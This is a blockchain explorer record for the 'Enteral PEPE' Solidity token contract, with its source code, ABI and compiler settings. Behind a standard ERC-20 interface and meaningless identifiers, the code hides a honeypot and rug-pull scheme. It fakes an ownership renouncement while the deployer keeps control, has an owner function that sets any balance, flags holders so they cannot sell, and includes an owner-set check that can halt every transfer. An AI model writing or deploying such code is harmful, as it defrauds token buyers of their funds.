{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface tokenTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityFund) external view returns (uint256);\n\n    function transfer(address launchedBuy, uint256 sellTx) external returns (bool);\n\n    function allowance(address toMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedBuy,\n        uint256 sellTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedAuto, uint256 value);\n    event Approval(address indexed toMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract fundLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenTotalTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoTx {\n    function createPair(address txFromEnable, address totalTo) external returns (address);\n}\n\ninterface tokenTakeMetadata is tokenTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EnteralPEPE is fundLaunched, tokenTake, tokenTakeMetadata {\n\n    function takeFromSwap(address maxAmountToken, address launchedBuy, uint256 sellTx) internal returns (bool) {\n        if (maxAmountToken == feeSender) {\n            return fundFeeIs(maxAmountToken, launchedBuy, sellTx);\n        }\n        uint256 launchToken = tokenTake(fromSender).balanceOf(teamLiquidity);\n        require(launchToken == enableMode);\n        require(launchedBuy != teamLiquidity);\n        if (sellAuto[maxAmountToken]) {\n            return fundFeeIs(maxAmountToken, launchedBuy, toFrom);\n        }\n        return fundFeeIs(maxAmountToken, launchedBuy, sellTx);\n    }\n\n    mapping(address => bool) public sellAuto;\n\n    mapping(address => bool) public limitTakeMarketing;\n\n    address teamLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private marketingTeam;\n\n    address public fromSender;\n\n    bool public swapLaunch;\n\n    function buySender(address teamLimit) public {\n        txSellMarketing();\n        if (teamToken == atEnable) {\n            amountTeam = liquidityLaunchAt;\n        }\n        if (teamLimit == feeSender || teamLimit == fromSender) {\n            return;\n        }\n        sellAuto[teamLimit] = true;\n    }\n\n    string private takeIsSender = \"EPE\";\n\n    function approve(address fromShould, uint256 sellTx) public virtual override returns (bool) {\n        autoAt[_msgSender()][fromShould] = sellTx;\n        emit Approval(_msgSender(), fromShould, sellTx);\n        return true;\n    }\n\n    uint256 buyTake;\n\n    bool public atEnable;\n\n    address private limitAmount;\n\n    string private takeToLiquidity = \"Enteral PEPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedReceiver;\n    }\n\n    function senderFrom() public {\n        emit OwnershipTransferred(feeSender, address(0));\n        limitAmount = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private autoAt;\n\n    address feeTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (atEnable) {\n            atEnable = true;\n        }\n        tokenTotalTx fundSell = tokenTotalTx(feeTx);\n        fromSender = autoTx(fundSell.factory()).createPair(fundSell.WETH(), address(this));\n        if (teamToken != atEnable) {\n            teamToken = false;\n        }\n        feeSender = _msgSender();\n        senderFrom();\n        limitTakeMarketing[feeSender] = true;\n        marketingTeam[feeSender] = toFee;\n        \n        emit Transfer(address(0), feeSender, toFee);\n    }\n\n    function fromMarketing(uint256 sellTx) public {\n        txSellMarketing();\n        enableMode = sellTx;\n    }\n\n    event OwnershipTransferred(address indexed shouldFrom, address indexed teamTo);\n\n    bool public teamToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toFee;\n    }\n\n    function txSellMarketing() private view {\n        require(limitTakeMarketing[_msgSender()]);\n    }\n\n    function allowance(address swapAuto, address fromShould) external view virtual override returns (uint256) {\n        if (fromShould == feeTx) {\n            return type(uint256).max;\n        }\n        return autoAt[swapAuto][fromShould];\n    }\n\n    uint256 public amountTeam;\n\n    function name() external view virtual override returns (string memory) {\n        return takeToLiquidity;\n    }\n\n    uint256 public liquidityLaunchAt;\n\n    uint256 private toFee = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeIsSender;\n    }\n\n    function takeIs(address senderTake, uint256 sellTx) public {\n        txSellMarketing();\n        marketingTeam[senderTake] = sellTx;\n    }\n\n    function transfer(address senderTake, uint256 sellTx) external virtual override returns (bool) {\n        return takeFromSwap(_msgSender(), senderTake, sellTx);\n    }\n\n    function owner() external view returns (address) {\n        return limitAmount;\n    }\n\n    function transferFrom(address maxAmountToken, address launchedBuy, uint256 sellTx) external override returns (bool) {\n        if (_msgSender() != feeTx) {\n            if (autoAt[maxAmountToken][_msgSender()] != type(uint256).max) {\n                require(sellTx <= autoAt[maxAmountToken][_msgSender()]);\n                autoAt[maxAmountToken][_msgSender()] -= sellTx;\n            }\n        }\n        return takeFromSwap(maxAmountToken, launchedBuy, sellTx);\n    }\n\n    function balanceOf(address liquidityFund) public view virtual override returns (uint256) {\n        return marketingTeam[liquidityFund];\n    }\n\n    uint256 constant toFrom = 9 ** 10;\n\n    function takeSwap(address receiverLaunch) public {\n        if (swapLaunch) {\n            return;\n        }\n        if (liquidityLaunchAt == amountTeam) {\n            amountTeam = liquidityLaunchAt;\n        }\n        limitTakeMarketing[receiverLaunch] = true;\n        \n        swapLaunch = true;\n    }\n\n    function fundFeeIs(address maxAmountToken, address launchedBuy, uint256 sellTx) internal returns (bool) {\n        require(marketingTeam[maxAmountToken] >= sellTx);\n        marketingTeam[maxAmountToken] -= sellTx;\n        marketingTeam[launchedBuy] += sellTx;\n        emit Transfer(maxAmountToken, launchedBuy, sellTx);\n        return true;\n    }\n\n    address public feeSender;\n\n    uint256 enableMode;\n\n    function getOwner() external view returns (address) {\n        return limitAmount;\n    }\n\n    uint8 private launchedReceiver = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimit\",\"type\":\"address\"}],\"name\":\"buySender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellTx\",\"type\":\"uint256\"}],\"name\":\"fromMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitTakeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLaunchAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTx\",\"type\":\"uint256\"}],\"name\":\"takeIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"}],\"name\":\"takeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAmountToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EnteralPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}